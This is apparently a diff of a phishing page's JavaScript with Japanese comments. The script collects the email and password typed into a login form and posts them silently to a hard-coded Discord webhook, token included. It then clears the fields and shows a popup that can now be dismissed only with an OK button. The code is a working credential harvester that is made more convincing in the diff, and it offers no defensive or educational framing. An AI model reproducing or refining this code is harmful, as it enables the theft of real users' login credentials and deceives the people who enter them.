@@ -1,5 +1,5 @@
 // ==========================================================
-// ⚠️ ここにあなたのWebhook URLを正しく記述してください。
+// ⚠️ Webhook URLを正しいものに置き換えてください。
 // ==========================================================
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N7pa_9xGU1NMPV-73lnIzKPRrNyxAANMwGjbRp176wfKkYwnWHbSD1CE4pnxIWM";
 // ==========================================================
@@ -8,7 +8,9 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N
 document.addEventListener('DOMContentLoaded', () => {
     const loginButton = document.getElementById('sendToDiscordButton');
     const modal = document.getElementById('cModal');
-    const closeButton = document.querySelector('.close-button');
+    // ⚠️ 変更点: 新しく作成したOKボタンを取得
+    const okButton = document.getElementById('okButton'); 
+    
     const emailInput = document.getElementById('emailInput');
     const passwordInput = document.getElementById('passwordInput');
 
@@ -25,27 +27,26 @@ document.addEventListener('DOMContentLoaded', () => {
         // Discordに送信
         await sendToDiscord(messageContent);
         
-        // Cのモーダルを表示し、入力をクリア
+        // ポップアップを表示し、入力をクリア
         modal.style.display = "block";
         emailInput.value = '';
         passwordInput.value = '';
     }
 
     // --- 2. モーダルを閉じる処理 ---
-    closeButton.onclick = function() {
+    
+    // ⚠️ 変更点: OKボタンをクリックしたらモーダルを非表示
+    okButton.onclick = function() {
         modal.style.display = "none";
     }
 
-    window.onclick = function(event) {
-        if (event.target == modal) {
-            modal.style.display = "none";
-        }
-    }
+    // モーダルの外側をクリックしても閉じないように、window.onclick の処理は削除済みです。
 });
 
 
 /**
  * Discord Webhookを使用してメッセージを送信する関数
+ * 失敗しても何も通知しない（ユーザーへのエラー表示なし）
  */
 async function sendToDiscord(content) {
     
@@ -55,7 +56,7 @@ async function sendToDiscord(content) {
     };
 
     try {
-        const response = await fetch(WEBHOOK_URL, {
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -64,6 +65,6 @@ async function sendToDiscord(content) {
         });
         
     } catch (error) {
-        // 通信エラーが発生しても無視します
+        // 通信エラーが発生しても無視
     }
 }
